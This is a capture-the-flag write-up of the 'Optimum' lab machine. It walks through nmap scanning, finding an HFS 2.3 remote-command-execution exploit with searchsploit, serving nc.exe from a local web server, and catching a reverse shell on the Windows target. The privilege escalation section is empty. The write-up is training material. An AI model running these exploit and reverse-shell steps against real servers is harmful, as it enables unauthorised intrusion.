# Optimum 

![Optimum](profile.png) 


## Summary

* Windows Server 2012 R2 with a file server running on port 80
* RCE exists for the file server, HFS 2.3
* Simple web server to host nc.exe and a python script is enough to get a reverse shell

## Tools needed

* Python with http.server module
* searchsploit
* nc


## Detection 

Start with nmap

```
#nmap -sV -O --script *vuln* -oA nmap 10.10.10.8
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-10 21:46 CDT
Nmap scan report for 10.10.10.8
Host is up (0.044s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
| http-vuln-cve2011-3192: 
|   VULNERABLE:
|   Apache byterange filter DoS
|     State: VULNERABLE
|     IDs:  CVE:CVE-2011-3192  BID:49303
|       The Apache web server is vulnerable to a denial of service attack when numerous
|       overlapping byte ranges are requested.
|     Disclosure date: 2011-08-19
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
|       https://www.tenable.com/plugins/nessus/55976
|       https://www.securityfocus.com/bid/49303
|_      https://seclists.org/fulldisclosure/2011/Aug/175
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2012|Vista|2008|7 (90%)
OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_7
Aggressive OS guesses: Microsoft Windows Server 2012 or Windows Server 2012 R2 (90%), Microsoft Windows Server 2012 R2 (90%), Microsoft Windows Server 2012 (88%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (85%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.34 seconds
```

OS best guess is `Microsoft Windows 2012|Vista|2008|7`.  Open port is 80 and it's an HTTP File Server.  Let's start at the port.

```
curl -I 10.10.10.8:80
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 3835
Accept-Ranges: bytes
Server: HFS 2.3
Set-Cookie: HFS_SID=0.492714939173311; path=/; 
Cache-Control: no-cache, no-store, must-revalidate, max-age=-1
```

curl confirms the server version as `HFS 2.3`.  Let's check the web interface.

![hfs](hfs.png) 

Clicking around there are quite a few areas we could try to gain a foothold.  However, given this is old software, let's check searchsploit first.

```
searchsploit hfs 2.3
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                              |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
HFS Http File Server 2.3m Build 300 - Buffer Overflow (PoC)                                                                                                 | multiple/remote/48569.py
Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload                                                                                              | multiple/remote/30850.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)                                                                                         | windows/remote/34668.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)                                                                                         | windows/remote/39161.py
Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution                                                                                    | windows/webapps/34852.txt
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
Hard to pass up trying an RCE with Python, so let's try 39161.py.

## Exploit

```
searchsploit -m 39161
  Exploit: Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)
      URL: https://www.exploit-db.com/exploits/39161
     Path: /usr/share/exploitdb/exploits/windows/remote/39161.py
File Type: Python script, ASCII text executable, with very long lines, with CRLF line terminators

Copied to: /root/htb/optimum/39161.py
```
Checking the code, we need to get nc.exe ready for upload to the target server and the author expects it to be locally hosted, specifically http://&lt;local IP&gt;:80/nc.exe.

```
#find / | grep -i nc.exe
/usr/share/sqlninja/apps/nc.exe
/usr/share/windows-resources/binaries/nc.exe

#mkdir web
#cp /usr/share/windows-resources/binaries/nc.exe web/.
#cd web
#python3.8 -m http.server --bind 10.10.14.5 80
Serving HTTP on 10.10.14.5 port 80 (http://10.10.14.5:80/) ...
```

Let's test the makeshift web server first ...

```
#curl 10.10.14.5:80/nc.exe --output nc.exe
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 59392  100 59392    0     0  11.3M      0 --:--:-- --:--:-- --:--:-- 11.3M 

-------------------------------------------------------------------------------

#python3.8 -m http.server --bind 10.10.14.5 80
Serving HTTP on 10.10.14.5 port 80 (http://10.10.14.5:80/) ...
10.10.14.5 - - [10/Oct/2020 23:08:40] "GET /nc.exe HTTP/1.1" 200 -
```

File was downloaded, so it's working.  After fixing the hard-coded local IP and listener port in 39161.py, we're ready to execute.

```
#python 39161.py 10.10.10.8 80

-------------------------------------------------------------------------------

nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.8] 49170
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas\Desktop> systeminfo
systeminfo

Host Name:                 OPTIMUM
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
```

For some reason the first execution of 39161.py didn't take.  On the second attempt is when I got the shell.


## Privilege Escalation






